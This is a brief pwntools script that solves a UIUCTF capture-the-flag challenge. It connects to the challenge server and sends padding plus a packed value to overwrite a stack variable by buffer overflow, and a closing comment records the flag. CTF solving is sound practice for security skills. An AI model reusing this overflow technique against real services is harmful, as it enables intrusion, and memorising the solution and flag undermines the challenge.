from pwn import *
import struct

HOST = 'chal.uiuc.tf'
PORT = 2003

r = remote(HOST,PORT)

pad = 0x10 * b'A'
val = 0x12345678

r.sendline(pad+struct.pack("<I",val)+ b"A" * 4)

r.interactive()
#uiuctf{stupid_flag_i_just_fell_out_of_the_bag}
